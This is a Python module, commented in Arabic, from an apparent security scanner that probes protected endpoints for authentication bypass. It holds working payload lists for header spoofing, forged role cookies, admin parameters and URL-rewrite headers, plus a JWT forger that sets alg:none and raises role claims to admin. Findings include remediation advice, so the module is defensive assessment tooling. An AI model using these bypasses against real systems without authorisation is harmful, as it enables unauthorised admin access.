# -*- coding: utf-8 -*-
"""
الوحدة — انتحال الصلاحية (Privilege Escalation / Auth Bypass)
================================================================
تختبر: هل يمكن توهيم تطبيقك أنك أدمن أو مستخدم مسجّل دخول وأنت لست كذلك؟

كل التقنيات هنا تخدع **منطق التحقق بالخادم نفسه** (كود تطبيقك/بروكسياتك) —
وليست خداعاً لبشر ولا أدوات تصيّد. هذي أشهر طرق انتحال الصلاحية بالعالم الحقيقي:

  1. Trusted-Header Spoofing — رؤوس مثل X-Forwarded-For / X-Admin /
     X-Forwarded-User قد يثق بها تطبيق أو بروكسي خطأً كمصدر هوية/صلاحية.
  2. Cookie/Role Forgery — تزوير قيمة كوكي الدور (role/isAdmin/...) بلا توقيع.
  3. Parameter Pollution — إضافة admin=true / role=admin كبارامتر بالرابط.
  4. X-Original-URL / X-Rewrite-URL — تهيئات بروكسي عكسي معيّنة (nginx+Rails
     القديم مثلاً) تعيد توجيه داخلياً بالاعتماد على هذي الرؤوس، فتتجاوز
     قواعد التحقق المطبَّقة على مسار العرض الظاهري فقط.
  5. JWT Forgery — تزوير توكن JWT بخوارزمية alg:none ورفع حقل الدور لـ admin.

يتطلب --active. **الفحص إثباتي فقط:** يقارن استجابة محمية (401/403) بمحاولة
الخداع؛ إن تحوّلت فعلاً لاستجابة مُصرَّح بها، يُسجَّل كإثبات دون أي استخدام
فعلي إضافي للوصول (لا تصفّح بيانات، لا تنزيل).
"""

import base64
import json
import re
import uuid

SENSITIVE_RE = re.compile(
    r"(admin|internal|private|manage|moderator|dashboard|backoffice|staff)", re.I)
AUTH_DENIED = {401, 403}

HEADER_BYPASSES = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Admin": "true"},
    {"X-Admin": "1"},
    {"X-Debug": "true"},
    {"X-Forwarded-User": "admin"},
    {"X-Remote-User": "admin"},
    {"X-User": "admin"},
    {"X-Internal-Request": "true"},
]
COOKIE_FORGE_CANDIDATES = [
    {"role": "admin"}, {"isAdmin": "true"}, {"is_admin": "true"},
    {"admin": "true"}, {"admin": "1"}, {"user_role": "admin"},
    {"access_level": "admin"}, {"level": "admin"}, {"privilege": "admin"},
]
PARAM_BYPASS = ["admin=true", "isAdmin=1", "role=admin", "debug=true",
                "internal=true", "bypass=1", "is_admin=true"]
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
ROLE_CLAIMS = ("role", "isAdmin", "is_admin", "admin", "scope", "permissions")


def _finding(title, severity, endpoint, evidence, owasp, fix):
    return {"id": "FIND-" + uuid.uuid4().hex[:6], "title": title,
            "severity": severity, "endpoint": endpoint,
            "evidence": (str(evidence) or "")[:400], "owasp": owasp,
            "remediation": fix}


def _body(r):
    return getattr(r, "_body_sample", "") or ""


def _code(r):
    return getattr(r, "status_code", 0)


def _looks_authenticated(r, baseline):
    """هل الاستجابة تحوّلت من رفض حقيقي إلى قبول حقيقي؟"""
    if _code(r) == 200 and baseline["code"] in AUTH_DENIED:
        return len(_body(r)) > max(30, baseline["len"] * 0.5)
    return False


def _sensitive_endpoints(discovered):
    eps = []
    for url, info in discovered.items():
        for ep in info.get("all_endpoints", []):
            if SENSITIVE_RE.search(ep):
                eps.append((info["base"], ep))
    return eps


def _try_header_bypass(session, ep, baseline, findings):
    for hdr in HEADER_BYPASSES:
        r = session.get(ep, headers=hdr, isolate_cookies=True)
        if _looks_authenticated(r, baseline):
            k, v = next(iter(hdr.items()))
            findings.append(_finding(
                "انتحال صلاحية عبر رأس موثوق (Trusted Header Spoofing)", "حرجة", ep,
                f"إرسال {k}: {v} حوّل الاستجابة من {baseline['code']} إلى 200 "
                f"(طول المحتوى {len(_body(r))} مقابل أساس {baseline['len']}).",
                "A01: Broken Access Control",
                "لا تثق بأي رأس HTTP قادم من العميل كمصدر هوية/صلاحية؛ "
                "اعتمد فقط على جلسة موقّعة من الخادم."))
            return True
    return False


def _try_cookie_forge(session, ep, baseline, findings):
    for cookie in COOKIE_FORGE_CANDIDATES:
        r = session.get(ep, cookies=cookie, isolate_cookies=True)
        if _looks_authenticated(r, baseline):
            k, v = next(iter(cookie.items()))
            findings.append(_finding(
                "انتحال صلاحية عبر تزوير كوكي الدور", "حرجة", ep,
                f"إرسال كوكي {k}={v} (بلا أي توقيع/تحقق مسبق) حوّل الاستجابة إلى 200.",
                "A01: Broken Access Control / A07",
                "لا تخزّن الدور/الصلاحية بكوكي قابل للتعديل من العميل؛ "
                "استخدم جلسة موقّعة بالخادم أو توكن موقّع ومُتحقَّق منه."))
            return True
    return False


def _try_param_bypass(session, ep, baseline, findings):
    sep = "&" if "?" in ep else "?"
    for p in PARAM_BYPASS:
        r = session.get(ep + sep + p, isolate_cookies=True)
        if _looks_authenticated(r, baseline):
            findings.append(_finding(
                "انتحال صلاحية عبر بارامتر مزوّر", "حرجة", ep + sep + p,
                f"إضافة ?{p} حوّلت الاستجابة من {baseline['code']} إلى 200.",
                "A01: Broken Access Control",
                "لا تتحكم صلاحية الوصول بارامتر يرسله العميل؛ اعتمد على الجلسة فقط."))
            return True
    return False


def _try_url_rewrite_bypass(session, base, ep, baseline, findings):
    path = ep[len(base):] if ep.startswith(base) else ep
    for hdr_name in ("X-Original-URL", "X-Rewrite-URL"):
        r = session.get(base, headers={hdr_name: path}, isolate_cookies=True)
        if _looks_authenticated(r, baseline):
            findings.append(_finding(
                "انتحال صلاحية عبر رأس إعادة الكتابة (URL Rewrite Bypass)",
                "حرجة", ep,
                f"إرسال {hdr_name}: {path} للجذر حوّل الاستجابة إلى 200 — "
                "يوحي بأن البروكسي العكسي يعيد التوجيه داخلياً اعتماداً على هذا الرأس.",
                "A01: Broken Access Control",
                "امنع رؤوس X-Original-URL/X-Rewrite-URL عند حافة الشبكة (edge) "
                "إن لم تكن ضرورية؛ لا تثق بها من العميل مباشرة."))
            return True
    return False


def _collect_jwts(recon):
    toks = set()
    for url, info in (recon or {}).items():
        blob = json.dumps(info.get("headers", {})) + info.get("body_sample", "")
        toks |= set(JWT_RE.findall(blob))
    return toks


def _forge_jwt_admin(token):
    """رفع صلاحية JWT: alg:none + رفع حقول الدور إلى admin/true. يرجّع None لو لا يوجد حقل دور."""
    try:
        h_b64, p_b64, _sig = token.split(".")
        pad = lambda s: s + "=" * (-len(s) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(h_b64)))
        payload = json.loads(base64.urlsafe_b64decode(pad(p_b64)))
    except Exception:
        return None
    changed = False
    for claim in ROLE_CLAIMS:
        if claim in payload:
            payload[claim] = "admin" if isinstance(payload[claim], str) else True
            changed = True
    if not changed:
        return None
    header["alg"] = "none"
    enc = lambda d: base64.urlsafe_b64encode(
        json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{enc(header)}.{enc(payload)}."


def _try_jwt_forge(session, ep, baseline, recon, findings):
    for tok in _collect_jwts(recon):
        forged = _forge_jwt_admin(tok)
        if not forged:
            continue
        r = session.get(ep, headers={"Authorization": f"Bearer {forged}"}, isolate_cookies=True)
        if _looks_authenticated(r, baseline):
            findings.append(_finding(
                "انتحال صلاحية عبر تزوير JWT (alg:none + رفع الدور)", "حرجة", ep,
                "توكن JWT مزوَّر برأس alg:none وحقل دور مرفوع إلى admin قُبِل من الخادم.",
                "A07: Identification & Authentication Failures",
                "ارفض alg=none صراحةً، وتحقّق من التوقيع بمفتاح الخادم فقط — "
                "لا تثق بأي حقل بالـ payload قبل التحقق الكامل من التوقيع."))
            return True
    return False


def run(session, discovered, recon=None, allow_active=False):
    if not allow_active:
        return []
    findings = []
    for base, ep in _sensitive_endpoints(discovered):
        try:
            r0 = session.get(ep, isolate_cookies=True)
            baseline = {"code": _code(r0), "len": len(_body(r0))}
            if baseline["code"] == 200:
                continue  # مكشوفة أصلاً بلا أي خداع — مُغطّاة في assess.py
            if _try_header_bypass(session, ep, baseline, findings):
                continue
            if _try_cookie_forge(session, ep, baseline, findings):
                continue
            if _try_param_bypass(session, ep, baseline, findings):
                continue
            if _try_url_rewrite_bypass(session, base, ep, baseline, findings):
                continue
            _try_jwt_forge(session, ep, baseline, recon, findings)
        except Exception:
            continue  # مسار مُحظور (مثل backups/restore) أو خطأ شبكة — تخطَّ بأمان

    seen, uniq = set(), []
    for f in findings:
        key = (f["title"], f["endpoint"])
        if key not in seen:
            seen.add(key); uniq.append(f)
    return uniq
